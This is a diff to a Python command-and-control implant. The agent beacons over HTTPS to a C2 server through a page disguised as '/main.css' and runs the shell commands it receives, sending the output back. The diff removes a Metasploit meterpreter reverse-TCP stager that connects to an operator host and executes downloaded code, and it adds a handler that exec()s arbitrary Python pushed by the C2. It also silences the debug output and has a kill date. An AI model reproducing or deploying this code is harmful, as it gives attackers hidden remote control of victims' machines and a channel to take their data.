@@ -17,7 +17,6 @@ from sys import exit, argv
 from datetime import datetime
 from platform import node, system, release
 from threading import Thread
-from struct import unpack
 from base64 import b64decode, b64encode
 
 ################################################
@@ -29,8 +28,17 @@ AGENT_PAGE      = "/main.css"
 SLEEP_TIME1     = 2
 SLEEP_TIME2     = 5
 SECRET_KEY      = '000000000000000116s92k48dss923j640s234v849c2001qi231d950g3s9df01esdr'
-SSL_VERSION     = ssl.PROTOCOL_TLSv1_1
+SSL_VERSION     = ssl.PROTOCOL_TLSv1
 KILL_DATE       = datetime(2020,6,11)
+
+################################################
+# Client Default Info
+################################################
+HOSTNAME        = node().strip()
+OS_VERSION      = system().strip() + release().strip()
+PID             = getpid()
+TYPE            = "python"
+PROTOCOL        = "HTTPS"
 
 ################################################
 # Client Request to C2
@@ -70,10 +78,10 @@ def http_request(send_data):
         # Receive response
         x = sock_recv(ssl_sock)
         sock_close(ssl_sock)
-        if "-debug" in argv: print("\n[<--] Response:\n {}".format(str(x)))
+        #if "-debug" in argv: print("\n[<--] Response:\n {}".format(str(x)))
         return x
     except Exception as e:
-        if "-debug" in argv: print("\n[!] agent_action exception hit:\n {}".format(str(e)))
+        #if "-debug" in argv: print("\n[!] agent_action exception hit:\n {}".format(str(e)))
         return False
 
 def sock_close(sock):
@@ -90,7 +98,6 @@ def sock_recv(sock):
         while True:
             new =sock.recv(buff_size)
             data += new
-            #print(new)
             if len(str(new)) < buff_size:
                 return data.decode('utf-8').rstrip('\n')
     except:
@@ -100,7 +107,7 @@ def sock_recv(sock):
 # Parse Response from C2
 ################################################
 def parse_response(data):
-    if "-debug" in argv: print("\n[*] Rcv Data: {}".format(data))
+    #if "-debug" in argv: print("\n[*] Rcv Data: {}".format(data))
     # Parse data returned from C2 looking for cmd
     cmd = data.split('<body>')[1].split('</body>')[0].strip()
     if not cmd:
@@ -144,13 +151,14 @@ def cmd_handler(cmd):
 
         # execute command
         else:
-            if "-debug" in argv: print("\n[*] Executing: {}".format(cmd))
-            if 'msfpayload' in str(cmd):
-                msf = cmd.split(" ")
-                Thread(target=cmd_thread, args=(msf[1], int(msf[2]),), daemon=True).start()
-                resp="Metasploit Command Executed Successfully"
+            #if "-debug" in argv: print("\n[*] Executing: {}".format(cmd))
+            tmp = CmdExec()
+            if cmd.startswith("#Module"):
+                t1 = Thread(target=tmp.mod_exec, args=(cmd,))
+                t1.daemon = True
+                t1.start()
+                resp = tmp.cmd
             else:
-                tmp = CmdExec()
                 t1 = Thread(target=tmp.cmd_exec, args=(cmd,))
                 t1.daemon=True
                 t1.start()
@@ -164,7 +172,7 @@ def cmd_handler(cmd):
         # Send data back to C2
         http_request(resp)
     except Exception as e:
-        if "-debug" in argv: print("\n[!] Cmd_handler error: {}".str(e))
+        #if "-debug" in argv: print("\n[!] Cmd_handler error: {}".str(e))
         http_request(str(e))
 
 ################################################
@@ -181,43 +189,24 @@ class CmdExec():
             self.cmd = str(e)
         self.running = False
 
+    def mod_exec(self,cmd):
+        try:
+            self.cmd = "[+] Module Executed"
+            exec(cmd)
+        except:
+            self.cmd = str(e)
+
 def cmd_timout(class_obj):
     sleep(120)
     class_obj.running = False
 
 ################################################
-# Built-in Metasploit Payload
-################################################
-def cmd_thread(msfhost, msfport):
-    # Payload for: msfvenom raw -p python/meterpreter/reverse_tcp LHOST= LPORT=
-    if "-debug" in argv: print("\n[!!] Spawning MSFpayload for: {}:{}".format(msfhost, msfport))
-    for x in range(10):
-        try:
-            s = socket.socket(2, socket.SOCK_STREAM)
-            s.connect((msfhost, msfport))
-            break
-        except:
-            sleep(5)
-    l = unpack('>I', s.recv(4))[0]
-    d = s.recv(l)
-    while len(d) < l:
-        d += s.recv(l - len(d))
-    exec(d, {'s': s})
-
-################################################
 # Client Main Loop
 ################################################
-HOSTNAME        = node().strip()
-OS_VERSION      = system().strip() + release().strip()
-PID             = getpid()
-TYPE            = "python"
-PROTOCOL        = "HTTPS"
-
 while KILL_DATE > datetime.now():
     try:
         # Check-in with C2 and response data & Execute command
         data = parse_response(http_request('check-in'))
-        if "-debug" in argv: print("\n[*] Main Rcv Data: {}".format(data))
         if data:
             cmd_handler(data)
     except KeyboardInterrupt:
